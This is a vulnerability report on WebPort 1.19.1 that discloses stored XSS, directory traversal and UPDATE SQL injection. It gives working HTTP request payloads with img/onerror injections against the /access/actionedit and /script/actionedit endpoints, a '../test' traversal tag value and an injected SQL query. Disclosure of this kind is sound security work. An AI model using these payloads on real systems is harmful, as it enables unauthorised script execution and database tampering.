# WebPort 1.19.1

---

# Stored xss  in /access/setup?type-conn

in /access/setup?type-conn, in connection name，parameter name will be injected into HTML content with out any filter

```
http://127.0.0.1:8188/access/actionedit

type=conn&ip=localhost&name=localhost'%3Cimg+src%3D%2F+onerror%3Dalert(1)%3E&allow=1&showpageinfo=1&pin=1&print=1&autologin=

```
![image.png-72.2kB][1]

# Directory traversal in tags of system settings

in tags of system settings, we can create a tags file just like tags.csv in `\WebPort\system\tags`.

and if we set tag=`../test`，and we will create a test.csv in `\WebPort\system\`

![image.png-70.5kB][2]

![image.png-48.3kB][3]

# Stored xss  in /script/listcalls

in /script/listcalls, in new called script, the description will be injected into HTML content with out any filter.

```
http://127.0.0.1:8188/script/actionedit

type=callscript&id=test&desc=test%3Cimg+src%3D%2F+onerror%3Dalert(1)%3E
```

![image.png-50.5kB][4]

# POST Stored xss and SQL injection in  /log?type=error

in /access/setup?type-conn, in connection name，parameter name will be injected into HTML content with out any filter.

but if we set a connection name with a double quote or a single quote,just like `test"` or `test'`, the connection name will be injected into UPDATE SQL query.

![image.png-32.8kB][5]

just like 
```
UPDATE Data SET data = '{"default":{"IP":"default","Name":"default","Allow":true,"AllowPin":false,"Fullscreen":false,"ShowPageInfo":true,"Zoom":false,"Scale":false,"EmbedPdf":false,"PinSidemenu":true,"AllowScriptCall":false,"AllowPrint":true,"AutoLogin":"","AllowAccessTicket":false,"AllowAccessTicketCreation":false,"DisplayConfiguration":{}},"localhost":{"IP":"localhost","Name":"localhost'

","Allow":true,"AllowPin":false,"Fullscreen":false,"ShowPageInfo":true,"Zoom":false,"Scale":false,"EmbedPdf":false,"PinSidemenu":true,"AllowScriptCall":false,"AllowPrint":true,"AutoLogin":"","AllowAccessTicket":false,"AllowAccessTicketCreation":false,"DisplayConfiguration":{}}}' WHERE deviceguid = '59E1AAD5-8DF6-4A3A-88BD-E311A536F71B' AND key = 'Connections'
```

it is a UPDATE SQL injection.

if you set connection name just like a `localhost <img src="/" onerror="alert(1)">`, so this name will  be injected into HTML content with out any filter.

![image.png-98.4kB][6]

![image.png-34.6kB][7]




  [1]: http://static.zybuluo.com/LoRexxar/7f1ccmu1ljn1a3r93a3uk1po/image.png
  [2]: http://static.zybuluo.com/LoRexxar/2fwd8eczezrfjw6leijcfvr3/image.png
  [3]: http://static.zybuluo.com/LoRexxar/uaoqmap7bavj8oxm0wcdrx0w/image.png
  [4]: http://static.zybuluo.com/LoRexxar/kur1cwwkvynr90byb6vlveni/image.png
  [5]: http://static.zybuluo.com/LoRexxar/xrt3ttlhbl2wylb5m93144uw/image.png
  [6]: http://static.zybuluo.com/LoRexxar/j93e9wxdpg86bh6yz5v6u5ue/image.png
  [7]: http://static.zybuluo.com/LoRexxar/mqyfm0diuu2rr1q74f57vohd/image.png